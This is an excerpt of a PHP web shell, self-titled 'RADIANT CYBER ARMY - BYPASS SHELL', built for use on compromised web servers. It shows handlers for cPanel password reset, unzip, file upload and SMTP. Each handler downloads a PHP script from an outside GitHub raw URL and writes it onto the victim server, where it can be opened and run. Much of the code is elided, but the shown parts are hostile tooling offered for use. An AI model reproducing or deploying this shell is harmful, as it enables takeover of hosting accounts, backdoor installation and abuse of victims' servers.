...
session_start();
set_time_limit(0);
$_n = 'RADIANT CYBER ARMY - BYPASS SHELL';
...
if ($_GET['do'] == 'resetcpanelpw') {
    ...
    if (file_exists('cpreset.php')) {
        ...
        if (adminer("https://raw.githubusercontent.com/private13377/RCA/main/cpanel.php", "cpreset.php")) {
            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/cpreset.php' target='_blank'>CPANEL RESET PASSWORD CLICK HERE !</a></font></center>";
        } else {
...
if ($_GET['do'] == 'unzip') {
    ...
    if (file_exists('unzip.php')) {
        ...
        if (adminer("https://raw.githubusercontent.com/private13377/RCA/main/unzip.php", "unzip.php")) {
...
if ($_GET['do'] == 'uploader') {
    ...
    if (file_exists('upl.php')) {
        ...
        if (adminer("https://raw.githubusercontent.com/private13377/RCA/main/upl.php", "upl.php")) {
            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/upl.php?prv8-upl' target='_blank'>PHP UPLOADER</a></font></center>";
        } else {
...
if ($_GET['do'] == 'smtp') {
    ...
    if (file_exists('smtp.php')) {
        ...
        if (adminer("https://raw.githubusercontent.com/private13377/RCA/main/smtp.php", "smtp.php")) {
...
<audio src="https://vajirawickramasingha.com/music.mp3" autoplay="autoplay" loop="loop" id="lagu">
